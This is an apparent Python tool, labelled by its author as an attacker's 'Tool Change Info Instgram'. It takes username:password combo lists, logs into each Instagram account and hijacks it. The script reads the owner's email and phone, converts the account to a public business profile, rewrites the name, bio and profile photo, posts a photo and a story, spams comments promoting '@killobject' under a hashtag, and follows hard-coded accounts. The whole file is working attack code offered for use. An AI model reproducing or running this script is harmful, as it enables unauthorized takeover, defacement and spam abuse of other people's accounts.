#!/usr/bin/env python
# """
#  ______   _______  _______  _        _______  _______  _______ 
# (  __  \ (  ____ \(  ____ \| \    /\(  ____ )(  ___  )(  ___  )
# | (  \  )| (    \/| (    \/|  \  / /| (    )|| (   ) || () () |
# | |   ) || (__    | (_____ |  (_/ / | (____)|| (___) || || || |
# | |   | ||  __)   (_____  )|   _ (  |     __)|  ___  || |(_)| |
# | |   ) || (            ) ||  ( \ \ | (\ (   | (   ) || |   | |===>("Ali")
# | (__/  )| (____/\/\____) ||  /  \ \| ) \ \__| )   ( || )   ( |
# (______/ (_______/\_______)|_/    \/|/   \__/|/     \||/     \|
# """         ___                  
# User --- > <(-_-)> Attcker --> :) 
# [+] Tool Change Info Instgram ! 

import requests, time, os, re, sys, random, json
from time import sleep
from pyfiglet import Figlet
from colorama import Fore

f = Figlet(font='epic')  
print(Fore.BLUE + f.renderText('DeskRam'))

def login(username,password):
        logina = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 Edg/110.0.0.0',
            'viewport-width': '424',
            'x-asbd-id': '198387',
            'x-csrftoken': 'missing',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR1IMAIWPNnlPeUCa1Z9ZHzY6Pxeu3W04eOOFPE_XrauU1OR',
            'x-instagram-ajax': '1006773434',
            'x-requested-with': 'XMLHttpRequest',
        }

        millisec = int(round(time.time() * 1000))
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time}:{password}"
        dataw = {
            'enc_password': enc_password,
            'username': f'{username}',
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}',
        }

        login = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=logina, data=dataw)
        if "userId" in login.text:
            co = login.cookies
            coo = co.get_dict()
            csrf = coo["csrftoken"]
            ds_user_id = coo["ds_user_id"]
            ig_did = coo["ig_did"]
            mid = coo["mid"]
            rur = ["rur"]
            sessionid = coo["sessionid"]
            print(f"True login : {username}")
            headersinfo = {
                'authority': 'www.instagram.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'cookie': f'mid={mid}; ig_did={ig_did}; ds_user_id={ds_user_id}; csrftoken={csrf}; sessionid={sessionid}; rur={rur}',
                'referer': 'https://www.instagram.com/accounts/edit/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 Edg/110.0.0.0',
                'viewport-width': '441',
                'x-asbd-id': '198387',
                'x-csrftoken': csrf,
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR3SHsxm5EnPleAZGQBE5KPzi7csKDtTv2ASzs93CM-XGesv',
                'x-requested-with': 'XMLHttpRequest',
            }
            info = requests.get('https://www.instagram.com/api/v1/accounts/edit/web_form_data/', headers=headersinfo)
            email = info.json()["form_data"]["email"]
            usernames = info.json()["form_data"]["username"]
            phone_number =info.json()["form_data"]["phone_number"]
            gender = info.json()["form_data"]["gender"]
            external_url = info.json()["form_data"]["external_url"]
            headerseditinfo = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': f'mid={mid}; ig_did={ig_did}; ds_user_id={ds_user_id}; csrftoken={csrf}; sessionid={sessionid}; rur={rur}',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/edit/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 Edg/110.0.0.0',
            'viewport-width': '726',
            'x-asbd-id': '198387',
            'x-csrftoken': csrf,
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR3SHsxm5EnPleAZGQBE5KPzi7csKDtTv2ASzs93CM-XGesv',
            'x-instagram-ajax': '1006978594',
            'x-requested-with': 'XMLHttpRequest',
        }
            headers_change_status_accunt = {
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 Edg/110.0.0.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'X-CSRFToken': csrf,
            'X-Instagram-AJAX': '1007035655',
            'X-IG-App-ID': '936619743392459',
            'X-ASBD-ID': '198387',
            'X-IG-WWW-Claim': 'hmac.AR1u3ABbnyrAcK0EM6I5ia6GjppAWDzogzqeXrrbuluSa75U',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.instagram.com',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Referer': 'https://www.instagram.com/accounts/convert_to_professional_account/',
            'Cookie': f'mid={mid}; ig_did={ig_did};csrftoken={csrf}; ds_user_id={ds_user_id}; sessionid={sessionid}; rur={rur}',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            }
            data__change_status_accunt = {
            'category_id': '2700',
            'create_business_id': 'true',
            'entry_point': 'ig_web_settings',
            'should_bypass_contact_check': 'true',
            'should_show_category': '0',
            'set_public': 'true',
            'to_account_type': '2',
            }
            resp_change_status_accunt = requests.post('https://www.instagram.com/api/v1/business/account/convert_account/',headers=headers_change_status_accunt,data=data__change_status_accunt).json()
            print(' Done Change Status to Business account ')

            dataedit = {
                'first_name': '⸙ძεՏκƦαʍ',#الاسم
                'email': f'{email}',
                'username': f'{usernames}',
                'phone_number': f'{phone_number}',
                'biography': '{اَفُعلّوا مٌاَشئتٍمٌ فُاَنَتٍمٌ علّى مٌوعد مٌع اَلّلّهً} @DeskRam',
                'external_url': f'{external_url}',
                'chaining_enabled': 'on',
            }

            editis = requests.post('https://www.instagram.com/api/v1/web/accounts/edit/', headers=headerseditinfo, data=dataedit)
            if editis.json()["status"] == "ok":
                      print(f"status info edit : {usernames} is : {editis.json()['status']} ")
            else:
                  print(f"status info edit : {usernames} is : {editis.json()['status']} ")

        
            path = "images.jpg" #الصوره
            p_pic = f"{path}"
            p_pic_s = os.path.getsize(path)
            headers = {
	    			"Host": "www.instagram.com",
	    			"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 Edg/110.0.0.0",
	    			"Accept": "*/*",
	    			"Accept-Language": "en-US,en;q=0.5",
	    			"Accept-Encoding": "gzip, deflate, br",
	    			"Referer": "https://www.instagram.com/pedro_lobito/",
	    			"X-CSRFToken": f"{csrf}",
	    			"X-Requested-With": "XMLHttpRequest",
	    			"Content-Length": str(p_pic_s),
	    			"DNT": "1",
	    			"Connection": "keep-alive",
	    			"Cookie": f'mid={mid}; ig_did={ig_did}; ds_user_id={ds_user_id}; csrftoken={csrf}; sessionid={sessionid}; rur={rur}'
	    	 }
            photo = "https://www.instagram.com/accounts/web_change_profile_picture/"
            files = {'profile_pic': open(p_pic,'rb')}
            values = {"Content-Disposition": "form-data", "name": "profile_pic", "filename":"profilepic.jpg","Content-Type": "image/jpeg"}
            rphoto = requests.post(photo, files=files, data=values, headers=headers)
            if rphoto.json()["status"] == "ok":
                  print(f"status photo edit : {usernames} is : {rphoto.json()['status']} ")
            else:
                  print(f"status photo edit : {usernames} is : {rphoto.json()['status']} ")

                                        #منشور
            print("start post photo")
            upload_id = str(int(time.time() * 1000))
            rupload_params = {
                        "retry_context": '{"num_step_auto_retry":0,"num_reupload":0,"num_step_manual_retry":0}',
                        "media_type": "1",  # "2" if upload_id else "1",
                        "xsharing_user_ids": "[]",
                        "upload_id": upload_id,
                        "image_compression": json.dumps(
                            {"lib_name": "moz", "lib_version": "3.1.m", "quality": "80"}
                        ),
                    }
            with open(path, "rb") as fp:
                        photo_data = fp.read()
                        photo_len = str(len(photo_data))
            upload_name = "{upload_id}_0_{rand}".format(upload_id=upload_id, rand=random.randint(1000000000, 9999999999))

            headersupload = {
                'authority': 'i.instagram.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'image/jpeg',
                'cookie': f'mid={mid}; ig_did={ig_did};csrftoken={csrf}; ds_user_id={ds_user_id}; sessionid={sessionid}; rur={rur}',
                'offset': '0',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 Edg/110.0.0.0',
                'x-asbd-id': '198387',
                'x-entity-length': photo_len,
                'x-entity-name': upload_name,
                'x-entity-type': 'image/jpeg',
                'x-ig-app-id': '936619743392459',
                'x-instagram-ajax': '1006987361',
                'x-instagram-rupload-params': json.dumps(rupload_params),
            }
            responseid = requests.post('https://i.instagram.com/rupload_igphoto/{name}'.format(name=upload_name),headers=headersupload,data=photo_data)
            if responseid.json()["status"] == "ok":
                    deskramid = responseid.json()["upload_id"]
                    headersPost = {
                        'authority': 'www.instagram.com',
                        'accept': '*/*',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': f'mid={mid}; ig_did={ig_did};csrftoken={csrf}; ds_user_id={ds_user_id}; sessionid={sessionid}; rur={rur}',
                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 Edg/110.0.0.0',
                        'x-csrftoken': csrf,
                        'x-ig-app-id': '936619743392459',
                    }

                    data = {
                        'source_type': 'library',
                        'caption': 'Ali ⸙ძεՏκƦαʍ',
                        'upload_id': f'{deskramid}',
                        'disable_comments': '0',
                        'like_and_view_counts_disabled': '0',
                        'igtv_share_preview_to_feed': '1',
                        'is_unified_video': '1',
                        'video_subtitles_enabled': '0',
                        'disable_oa_reuse': 'false',
                    }
                    responsephoto = requests.post('https://www.instagram.com/api/v1/media/configure/', headers=headersPost, data=data)
                    if responsephoto.json()["status"] == "ok":
                            print(f'https://www.instagram.com/p/{responsephoto.json()["media"]["code"]}')
                    else:
                          print(f'post photo is {responsephoto.json()["status"]}')
            else:
                  print(f'post id photo is {responseid.json()["status"]}')
            print("Now post Story")
            upload_id = str(int(time.time() * 1000))
            rupload_params = {
                        "retry_context": '{"num_step_auto_retry":0,"num_reupload":0,"num_step_manual_retry":0}',
                        "media_type": "1",  # "2" if upload_id else "1",
                        "xsharing_user_ids": "[]",
                        "upload_id": upload_id,
                        "image_compression": json.dumps(
                            {"lib_name": "moz", "lib_version": "3.1.m", "quality": "80"}
                        ),
                    }
            upload_id = str(int(time.time() * 1000))
            path2 = "images.jpg" #الصوره
            p_pic = f"{path2}"
            p_pic_s = os.path.getsize(path)
            with open(path2, "rb") as fp:
                        photo_data = fp.read()
                        photo_len = str(len(photo_data))
            upload_name = "fb_uploader_{upload_id}".format(upload_id=upload_id)
            headers = {
                'authority': 'i.instagram.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'image/jpeg',
                'cookie': f'mid={mid}; ig_did={ig_did};csrftoken={csrf}; ds_user_id={ds_user_id}; sessionid={sessionid}; rur={rur}',
                'offset': '0',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 Edg/110.0.0.0',
                'x-asbd-id': '198387',
                'x-entity-length': photo_len,
                'x-entity-name': upload_name,
                'x-entity-type': 'image/jpeg',
                'x-ig-app-id': '1217981644879628',
                'x-instagram-ajax': '1007055325',
                'x-instagram-rupload-params': json.dumps(rupload_params)
            }
            responseupload_id = requests.post('https://i.instagram.com/rupload_igphoto/{name}'.format(name=upload_name),headers=headers,data=photo_data)
            if responseupload_id.json()["status"] == "ok":
                story = responseupload_id.json()["upload_id"]
                headers = {
                    'authority': 'www.instagram.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'cookie': f'mid={mid}; ig_did={ig_did};csrftoken={csrf}; ds_user_id={ds_user_id}; sessionid={sessionid}; rur={rur}',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/create/story/',
                    'sec-ch-prefers-color-scheme': 'light',
                    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 Edg/110.0.0.0',
                    'viewport-width': '360',
                    'x-asbd-id': '198387',
                    'x-csrftoken': csrf,
                    'x-ig-app-id': '1217981644879628',
                    'x-ig-www-claim': 'hmac.AR0lwmIpRbHRgBcqk5JjHYIBHA1FZVgrcQv_i-bigXlwqdDi',
                    'x-instagram-ajax': '1006987361',
                    'x-requested-with': 'XMLHttpRequest',
                }
                data = {'upload_id': f'{story}','caption': 'Ali ⸙ძεՏκƦαʍ',}
                response = requests.post('https://www.instagram.com/api/v1/web/create/configure_to_story/',headers=headers,data=data,)
                if response.json()["status"] == "ok":
                    print(f'Post Story is {response.json()["status"]}')
                else:
                    print(f'Post Story is {response.json()["status"]}')
            else:
                print(f'story upload_id is {responseupload_id.json()["status"]}')
            headerscomm = {
                'authority': 'www.instagram.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'cookie': f'mid={mid}; ig_did={ig_did}; ds_user_id={ds_user_id}; csrftoken={csrf}; sessionid={sessionid}; rur={rur}',
                'origin': 'https://www.instagram.com',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 Edg/110.0.0.0',
                'viewport-width': '423',
                'x-asbd-id': '198387',
                'x-csrftoken': csrf,
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR0LQ3lD7wLaTH7uHEkX70s-YMw4GU1UPXkowI150swT07lk',
                'x-instagram-ajax': '1006768086',
                'x-requested-with': 'XMLHttpRequest',
            }
            def deskram():
                    for i in range(1):
                        try:
                            hashtag = {'tag_name': 'اكسبلور',}
                            pkposts = requests.get('https://www.instagram.com/api/v1/tags/web_info/', params=hashtag, headers=headerscomm).json()
                            for u in pkposts["data"]["recent"]["sections"]:
                                apk = u["layout_content"]["medias"][0]["media"]["pk"]
                                emoji = ["🤍","❤️","👏","🙌,","😮","😍","👏","🔥"]
                                comment = {'comment_text': f'@killobject {random.choice(emoji)}',}
                                setcomment = requests.post(f'https://www.instagram.com/api/v1/web/comments/{apk}/add/',headers=headerscomm,data=comment,)
                                url = "https://www.instagram.com/p/" + u["layout_content"]["medias"][0]["media"]["code"]
                                if setcomment.json()['status'] == "ok":
                                    print(f"comment DONE by {usernames} to :{url} , status : {setcomment.json()['status']} ")
                                    sleep(6)
                                else:
                                    print(f"comment DONE by {usernames} to :{url} , status : {setcomment.json()['status']} ")
                        except: 
                                print("error")
            print(f"Start comment : by {usernames} ")
            deskram()
            print(f"Done all comment : by {usernames} ")
            print(f"start follow : by {usernames} ")
            headersfollow = {
                'authority': 'www.instagram.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': f'mid={mid}; ig_did={ig_did}; ds_user_id={ds_user_id}; csrftoken={csrf}; sessionid={sessionid}; rur={rur}',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/layalbarbr/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36 Edg/110.0.0.0',
                'viewport-width': '726',
                'x-asbd-id': '198387',
                'x-csrftoken': csrf,
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR0lwmIpRbHRgBcqk5JjHYIBHA1FZVgrcQv_i-bigXlwqUTS',
                'x-instagram-ajax': '1006979324',
                'x-requested-with': 'XMLHttpRequest',
            }
            ids = "919551301","31689554130","522914141","43828939861","2111016973"
            folw = 0
            for id in ids:
              folw += 1
              follows = requests.post(f'https://www.instagram.com/api/v1/web/friendships/{id}/follow/',headers=headersfollow)
              if follows.json()["status"] == "ok":
                print(f"follow by {usernames} : {folw} > status : {follows.json()['status']} ")
              else:
                   print(f"follow by {usernames} : {folw} > status : {follows.json()['status']} ")
            print(f"Done follow all : by {usernames} ")
        else:
             print(f"error login {username}")

                                #main start
combo_FILE = "combo.txt" #كومبو
if not os.path.isfile(combo_FILE):
    print("combo file is not exit: ", combo_FILE)
    sys.exit(0)
Email_data = open(combo_FILE, 'r').read().split("\n")
print("combo file selected: ", combo_FILE)
with open(combo_FILE) as f:
        for combo in f:
            combo = combo.strip()
            users = re.findall(r"(.*):", str(combo))
            passs = user = re.findall(r":(.*)", str(combo))
            login(users[0],passs[0])
print("DONE all acc change")